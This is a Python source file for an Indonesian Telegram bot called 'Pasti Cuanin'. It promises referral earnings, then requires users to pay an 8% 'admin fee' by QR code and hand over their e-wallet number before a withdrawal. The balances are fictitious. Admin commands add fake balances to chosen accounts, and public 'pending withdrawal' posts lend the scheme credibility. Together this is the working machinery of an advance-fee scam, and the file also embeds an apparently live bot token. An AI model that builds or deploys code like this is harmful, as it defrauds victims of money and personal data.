from datetime import datetime
import logging
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    Update,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# 1. Konfigurasi Logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# TODO: Ganti dengan Token Bot asli Anda dari @BotFather
TOKEN = "9186649990:AAFee8sQUXFu_NMc9PyT6N5xW7CeRizLHKk"

# 🔑 KONFIGURASI ID
ADMIN_ID = 6825271410      # Ganti dengan Telegram User ID pribadi Kakak (untuk tombol Approve/Reject & Notif Refresh)
CHANNEL_ID = -1004367716483  # Ganti dengan ID Grup Publik tempat pesan "NEW PENDING WITHDRAWAL" muncul
ADMIN_USERNAME = "@daisukeshinomiya"

QR_IMAGE_URL = "https://ibb.co.com/JWLJbQnK"

# Database Simulasi Sementara
users_db = {}
pending_withdrawals = {}
wd_counter = 14360  


def get_main_reply_keyboard():
    keyboard = [
        [KeyboardButton("💸 Hasilkan Uang"), KeyboardButton("💳 Withdrew")],
        [KeyboardButton("📜 Riwayat WD"), KeyboardButton("📞 Hubungi Admin")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_id = user.id

    if user_id not in users_db:
        args = context.args
        referred_by = None
        if args and args[0].isdigit():
            referred_by = int(args[0])
            if referred_by in users_db and referred_by != user_id:
                users_db[referred_by]["balance"] += 70000
                users_db[referred_by]["referral_count"] = (
                    users_db[referred_by].get("referral_count", 0) + 1
                )

        users_db[user_id] = {
            "balance": 0,
            "referral_count": 0,
            "ref_by": referred_by,
            "state": "IDLE",
            "wd_amount": 0,
            "wd_method": "",
            "wd_history": [],
        }

    welcome_text = (
        f"💡 **WELCOME TO PASTI CUANIN BOT** 💡\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Platform terpercaya untuk mendapatkan penghasilan harian dengan cepat dan aman.\n\n"
        f"📊 **STATISTIK AKUN ANDA**\n"
        f"├ 👤 ID User: `{user_id}`\n"
        f"├ 💰 Saldo: **Rp {users_db[user_id]['balance']:,.0f}**\n"
        f"└ 👥 Referral: **{users_db[user_id]['referral_count']} Orang**\n\n"
        f"⚙️ **INFORMASI SISTEM**\n"
        f"├ 🎁 Bonus Referral: Rp 70.000 / User\n"
        f"├ 💳 Minimal WD: Rp 200.000\n"
        f"├ ⚡ Proses WD: 1–5 Menit (Otomatis)\n"
        f"└ 📞 Admin Resmi: {ADMIN_USERNAME}\n\n"
        f"💡 *Klik menu \"💸 Hasilkan Uang\" di bawah untuk membagikan link referral kamu dan mulai menghasilkan!*"
    )

    if update.message:
        await update.message.reply_text(
            welcome_text, reply_markup=get_main_reply_keyboard(), parse_mode="Markdown"
        )


# Fitur Admin: Menambah saldo sendiri (/addsaldo <jumlah>)
async def add_saldo_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return

    if context.args and context.args[0].isdigit():
        amount = int(context.args[0])
        user_id = update.effective_user.id
        
        if user_id not in users_db:
            users_db[user_id] = {
                "balance": 0, "referral_count": 0, "ref_by": None, "state": "IDLE", "wd_amount": 0, "wd_method": "", "wd_history": []
            }
            
        users_db[user_id]["balance"] += amount
        await update.message.reply_text(f"✅ Berhasil! Saldo Anda ditambah sebesar Rp {amount:,.0f}", parse_mode="Markdown")
    else:
        await update.message.reply_text("Gunakan format: /addsaldo 250000")


# Fitur Admin: Menambah saldo teman (/tambahsaldo <id_user> <jumlah>)
async def tambah_saldo_teman(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return

    if len(context.args) >= 2 and context.args[0].isdigit() and context.args[1].isdigit():
        target_user_id = int(context.args[0])
        amount = int(context.args[1])

        if target_user_id in users_db:
            users_db[target_user_id]["balance"] += amount
            await update.message.reply_text(
                f"✅ **BERHASIL MENAMBAH SALDO TEMAN**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"├ 👤 Target ID: `{target_user_id}`\n"
                f"├ 💰 Tambahan: Rp {amount:,.0f}\n"
                f"└ 💳 Saldo Terbaru: Rp {users_db[target_user_id]['balance']:,.0f}",
                parse_mode="Markdown"
            )
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=(
                        f"🎁 **SELAMAT! SALDO ANDA DITAMBAHKAN ADMIN** 🎁\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"Admin telah mengirimkan tambahan saldo sebesar **Rp {amount:,.0f}** ke akun Anda!\n\n"
                        f"💰 Saldo Sekarang: **Rp {users_db[target_user_id]['balance']:,.0f}**"
                    ),
                    parse_mode="Markdown"
                )
            except Exception:
                pass
        else:
            await update.message.reply_text(f"❌ User ID `{target_user_id}` belum terdaftar di database bot.", parse_mode="Markdown")
    else:
        await update.message.reply_text("⚠️ **Format Salah!**\nGunakan format: `/tambahsaldo <id_user> <jumlah>`", parse_mode="Markdown")


async def handle_text_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = update.message.text
    user_id = update.effective_user.id

    if user_id not in users_db:
        users_db[user_id] = {
            "balance": 0,
            "referral_count": 0,
            "ref_by": None,
            "state": "IDLE",
            "wd_amount": 0,
            "wd_method": "",
            "wd_history": [],
        }

    balance = users_db[user_id]["balance"]

    if text == "💸 Hasilkan Uang":
        bot_username = context.bot.username
        ref_link = f"https://t.me/{bot_username}?start={user_id}"
        
        ref_text = (
            f"💸 **PROGRAM REFERRAL PASTI CUANIN** 💸\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Bagikan link referral unik Anda kepada teman atau ke media sosial untuk mendapatkan penghasilan tambahan secara instan!\n\n"
            f"🎁 **Bonus Referral:** Rp 70.000 / Orang\n\n"
            f"🔗 **Link Referral Anda:**\n"
            f"`{ref_link}`\n\n"
            f"💡 *Semakin banyak teman yang bergabung menggunakan link Anda, semakin besar saldo yang bisa Anda tarik!*"
        )
        await update.message.reply_text(
            ref_text, parse_mode="Markdown", reply_markup=get_main_reply_keyboard()
        )

    elif text == "💳 Withdrew":
        if balance < 200000:
            await update.message.reply_text(
                f"❗ **SALDO TIDAK MENCUKUPI!**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"├ 💰 Saldo Anda: **Rp {balance:,.0f}**\n"
                f"└ 📉 Minimal WD: **Rp 200.000**\n\n"
                f"💡 *Silakan kumpulkan saldo tambahan melalui menu \"💸 Hasilkan Uang\".*",
                parse_mode="Markdown",
            )
        else:
            users_db[user_id]["wd_amount"] = balance
            keyboard = [
                [
                    InlineKeyboardButton("🟢 DANA", callback_data="ewallet_dana"),
                    InlineKeyboardButton("🔵 GoPay", callback_data="ewallet_gopay"),
                ]
            ]
            await update.message.reply_text(
                "💳 **PILIH METODE E-WALLET PENARIKAN**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nSilakan pilih metode di bawah ini:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="Markdown",
            )

    elif text == "📜 Riwayat WD":
        history = users_db[user_id]["wd_history"]
        if not history:
            await update.message.reply_text(
                "📜 **RIWAYAT PENARIKAN ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n❌ Belum ada riwayat penarikan dana.",
                parse_mode="Markdown",
            )
        else:
            hist_text = "📜 **RIWAYAT PENARIKAN ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            for item in history:
                hist_text += (
                    f"├ ID WD: `{item['id']}`\n"
                    f"├ Nominal: Rp {item['amount']:,.0f}\n"
                    f"└ Status: **{item['status']}**\n\n"
                )
            await update.message.reply_text(hist_text, parse_mode="Markdown")

    elif text == "📞 Hubungi Admin":
        await update.message.reply_text(
            f"📞 **LAYANAN BANTUAN ADMIN**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Silakan hubungi admin resmi kami jika mengalami kendala:\n\n👉 **{ADMIN_USERNAME}**",
            parse_mode="Markdown",
        )

    else:
        user_state = users_db[user_id].get("state", "IDLE")
        if user_state == "WAITING_FOR_PHONE":
            phone_number = text
            wd_amount = users_db[user_id]["wd_amount"]
            wd_method = users_db[user_id].get("wd_method", "DANA")
            admin_fee = int(wd_amount * 0.08)

            users_db[user_id]["state"] = "WAITING_FOR_ADMIN_FEE"

            # 1. Kirim QR Code ke chat pribadi user
            qr_caption = (
                f"🛡️ **VERIFIKASI BIAYA ADMIN 8%** 🛡️\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 Nomor E-Wallet: `{phone_number}`\n"
                f"💰 Total Penarikan: Rp {wd_amount:,.0f}\n"
                f"⚡ **Biaya Admin (8%): Rp {admin_fee:,.0f}**\n\n"
                f"📲 *Silakan lakukan pembayaran ke QR di bawah, lalu wajib klik tombol Refresh di bawah setelah selesai!*"
            )
            keyboard = [
                [
                    InlineKeyboardButton(
                        "🔄 Refresh Status Pembayaran",
                        callback_data="refresh_status",
                    )
                ]
            ]
            await update.message.reply_photo(
                photo=QR_IMAGE_URL,
                caption=qr_caption,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="Markdown",
            )

            # Persiapan Data WD 
            global wd_counter
            wd_counter += 1
            current_wd_id = f"#{wd_counter}"
            
            masked_phone = phone_number
            if len(phone_number) >= 8:
                masked_phone = phone_number[:4] + "****" + phone_number[-4:]

            current_time_str = datetime.now().strftime("%d/%m/%Y | %H:%M") + " WIB"

            pending_withdrawals[current_wd_id] = {
                "user_id": user_id,
                "amount": wd_amount,
                "phone": phone_number,
                "method": wd_method,
            }

            # Teks Laporan yang akan muncul di GRUP PUBLIK
            public_group_report = (
                f"🚨 **NEW PENDING WITHDRAWAL**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"ID WD : `{current_wd_id}`\n"
                f"User  : `{user_id}`\n"
                f"Amount: Rp {wd_amount:,.0f}\n"
                f"Method: {wd_method}\n"
                f"Number: `{masked_phone}`\n"
                f"Date  : {current_time_str}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"STATUS : SILAKAN SCAN QRIS ADMIN 8%"
            )

            # 2. Kirim otomatis ke GRUP PUBLIK (bisa dilihat member lain)
            await context.bot.send_message(
                chat_id=CHANNEL_ID,
                text=public_group_report,
                parse_mode="Markdown"
            )

            # 3. Kirim panel tombol Approve/Reject secara RAHASIA ke CHAT PRIBADI ADMIN
            admin_private_control = (
                f"🔔 **[KONTROL ADMIN] PENDING WD BARU**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"ID WD : `{current_wd_id}`\n"
                f"User ID: `{user_id}`\n"
                f"Amount: Rp {wd_amount:,.0f} ({wd_method})\n"
                f"No HP : `{phone_number}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Silakan cek mutasi biaya admin, lalu pilih aksi di bawah:"
            )
            admin_keyboard = [
                [
                    InlineKeyboardButton("✅ Approve (Sukses)", callback_data=f"app_{current_wd_id}"),
                    InlineKeyboardButton("❌ Reject", callback_data=f"rej_{current_wd_id}"),
                ]
            ]
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=admin_private_control,
                reply_markup=InlineKeyboardMarkup(admin_keyboard),
                parse_mode="Markdown",
            )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data.startswith("ewallet_"):
        wallet_type = data.split("_")[1].upper()
        users_db[user_id]["state"] = "WAITING_FOR_PHONE"
        users_db[user_id]["wd_method"] = wallet_type  
        
        await query.edit_message_text(
            text=f"📱 **MASUKKAN NOMOR {wallet_type}**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n✍️ *Silakan ketik dan kirim nomor akun {wallet_type} kamu di kolom chat:*",
            parse_mode="Markdown",
        )

    elif data == "refresh_status":
        # Notifikasi klik refresh masuk ke CHAT PRIBADI ADMIN
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🔄 **[NOTIFIKASI REFRESH]**\nUser dengan ID `{user_id}` baru saja mengeklik tombol **Refresh Status Pembayaran**. Silakan cek mutasi pembayaran admin!",
            parse_mode="Markdown"
        )
        await query.answer(
            "⏳ Status: Permintaan refresh Anda telah dikirim ke admin. Mohon tunggu sebentar ya!",
            show_alert=True,
        )

    elif data.startswith("app_") or data.startswith("rej_"):
        if user_id != ADMIN_ID:
            return

        action, wd_id = data.split("_")
        if wd_id in pending_withdrawals:
            wd_data = pending_withdrawals[wd_id]
            target_user_id = wd_data["user_id"]
            amount = wd_data["amount"]

            if action == "app":
                users_db[target_user_id]["balance"] = 0
                users_db[target_user_id]["state"] = "IDLE"
                users_db[target_user_id]["wd_history"].append(
                    {
                        "id": wd_id,
                        "amount": amount,
                        "status": "SUCCESS ✅",
                    }
                )

                # Kirim pesan sukses ke pengguna secara pribadi
                success_msg = (
                    f"🎉 **WITHDRAW BERHASIL DITERIMA** 🎉\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"Dana sebesar Rp {amount:,.0f} telah dikirimkan ke nomor e-wallet Anda.\n"
                    f"🚀 Saldo sukses masuk dalam 5-10 menit. Terima kasih!"
                )
                await context.bot.send_message(
                    chat_id=target_user_id, text=success_msg, parse_mode="Markdown"
                )
                await query.edit_message_text(
                    text=f"✅ WD ID `{wd_id}` telah berhasil di-**APPROVE**."
                )

            elif action == "rej":
                users_db[target_user_id]["state"] = "IDLE"
                users_db[target_user_id]["wd_history"].append(
                    {
                        "id": wd_id,
                        "amount": amount,
                        "status": "REJECTED ❌",
                    }
                )
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"❌ Mohon maaf, penarikan WD dengan ID `{wd_id}` ditolak atau dibatalkan oleh admin.",
                    parse_mode="Markdown",
                )
                await query.edit_message_text(
                    text=f"❌ WD ID `{wd_id}` telah di-**REJECT**."
                )
            
            del pending_withdrawals[wd_id]
        else:
            await query.edit_message_text(text="⚠️ Data WD sudah diproses sebelumnya.")


def main() -> None:
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("addsaldo", add_saldo_admin))
    application.add_handler(CommandHandler("tambahsaldo", tambah_saldo_teman))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_menu)
    )

    application.run_polling()


if __name__ == "__main__":
    main()